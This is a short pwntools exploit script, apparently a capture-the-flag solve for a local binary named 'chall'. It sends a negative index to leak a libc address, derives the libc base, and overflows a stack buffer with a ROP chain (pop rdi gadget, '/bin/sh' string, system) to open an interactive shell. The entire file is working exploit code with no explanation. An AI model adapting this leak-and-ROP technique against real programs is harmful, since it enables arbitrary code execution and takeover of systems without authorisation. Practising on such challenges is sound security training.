#!/usr/bin/env python3

from pwn import *

TARGET = './chall'
context.arch = 'amd64'
elf = ELF(TARGET)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(TARGET)

payload = b'-48'
p.sendline(payload)

p.recvuntil(b'index: ')
leak = int(p.recvline()[:-1].decode(), 16)

print(f"hex(leak) : {hex(leak)}")
print(f"system offset: {hex(libc.address)}")

# print(f"system() : {hex(libc.sym.system)}") # offset doang
libc.address = leak - 0x52150
print(f"base address: {hex(libc.address)}")
print(f"system() : {hex(libc.sym.system)}")

system = libc.sym.system
binsh = next(libc.search(b'/bin/sh\x00'))
pop_rdi = libc.address + 0xd2966 # pop rdi; ret;

payload = b'A' * 56 + p64(pop_rdi+1) + p64(pop_rdi) + p64(binsh) + p64(system)

# system('/bin/sh')



p.sendline(payload)

p.interactive()
